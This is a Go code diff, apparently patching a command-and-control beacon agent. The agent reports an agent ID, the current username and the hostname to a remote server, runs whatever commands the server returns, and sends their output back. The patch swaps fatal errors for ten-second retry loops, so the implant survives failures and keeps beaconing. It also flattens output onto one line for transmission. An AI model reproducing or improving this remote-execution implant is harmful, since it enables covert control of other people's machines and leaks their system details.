@@ -25,31 +25,42 @@ func main() {
 	if *serverAddr != "localhost:8080" {
 		ServerAddr = *serverAddr
 	}
-	hostname, err := os.Hostname()
-	if err != nil {
-		log.Fatalf("failed to get hostname: %v", err)
-	}
-	currentUser, err := user.Current()
-	if err != nil {
-		log.Fatalf("failed to get current user: %v", err)
-	}
+	
 	for {
+		hostname, err := os.Hostname()
+		if err != nil {
+		log.Printf("failed to get hostname: %v", err)
+		time.Sleep(10 * time.Second)
+		continue
+		}
+		currentUser, err := user.Current()
+		if err != nil {
+			log.Printf("failed to get current user: %v", err)
+			time.Sleep(10 * time.Second)
+			continue
+		}
 
 		conn, err := net.Dial("tcp", ServerAddr)
 		if err != nil {
-			log.Fatalf("failed to connect to server: %v", err)
+			log.Printf("failed to connect to server: %v", err)
+			time.Sleep(10 * time.Second)
+			continue
 		}
 
 		message := fmt.Sprintf("%s:%s:%s\n", AgentID, currentUser.Username, hostname)
 		_, err = conn.Write([]byte(message))
 		if err != nil {
-			log.Fatalf("failed to send message: %v", err)
+			log.Printf("failed to send message: %v", err)
+			time.Sleep(10 * time.Second)
+			continue
 		}
 
 		reader := bufio.NewReader(conn)
 		response, err := reader.ReadString('\n')
 		if err != nil {
-			log.Fatalf("failed to read response: %v", err)
+			log.Printf("failed to read response: %v", err)
+			time.Sleep(10 * time.Second)
+			continue
 		}
 		if strings.HasPrefix(response, "ACK:") {
 			log.Printf("beacon acknowledged")
@@ -63,9 +74,13 @@ func main() {
 			output, err := cmd.CombinedOutput()
 			if err != nil {
 				log.Printf("failed to execute command: %v", err)
+				time.Sleep(10 * time.Second)
+				continue
 			}
 			log.Printf("command output: %s", output)
-			conn.Write([]byte(output))
+			flat := strings.ReplaceAll(string(output), "\n", " ")
+			conn.Write([]byte(flat + "\n"))
+
 		}
 		conn.Close()
 		time.Sleep(10 * time.Second)
